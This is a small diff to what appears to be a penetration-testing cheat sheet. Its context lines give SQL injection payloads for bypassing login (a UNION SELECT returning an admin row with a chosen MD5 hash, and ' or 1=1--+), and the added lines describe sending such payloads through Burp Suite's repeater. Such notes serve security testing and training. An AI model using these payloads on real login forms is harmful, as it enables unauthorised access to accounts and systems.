@@ -202,6 +202,14 @@ Bypass MD5 hash username:
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 Password bypass
 ' or 1=1--+
+
+BURPE SUITE INJECTION
+Open login webpage in burpe suite
+- attempt login in portswigger browser
+- capture login request on proxy HTTP history
+- send POST request to repeater
+- change username and password values to exploits
+
 ```
 
 ### Log poisoning
